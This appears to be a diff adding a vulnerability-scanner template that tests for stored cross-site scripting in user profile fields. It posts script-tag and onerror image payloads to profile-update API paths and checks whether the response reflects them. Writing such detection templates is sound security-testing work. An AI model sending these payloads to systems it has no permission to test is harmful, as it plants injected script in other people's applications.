@@ -1,0 +1,33 @@
+id: whai-xss-stored-profile
+
+info:
+  name: Stored XSS via User Profile Fields
+  author: whitehat-ai
+  severity: critical
+  description: Tests stored XSS in profile fields (name, bio, website)
+  tags: xss,stored,critical
+  classification:
+    cwe-id: CWE-79
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/profile"
+      - "{{BaseURL}}/api/v1/user/update"
+
+    headers:
+      Content-Type: application/json
+
+    body: '{"name":"<script>alert(1)</script>","bio":"<img src=x onerror=alert(1)>"}'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<script>alert(1)</script>"
+          - "<img src=x onerror="
+        condition: or
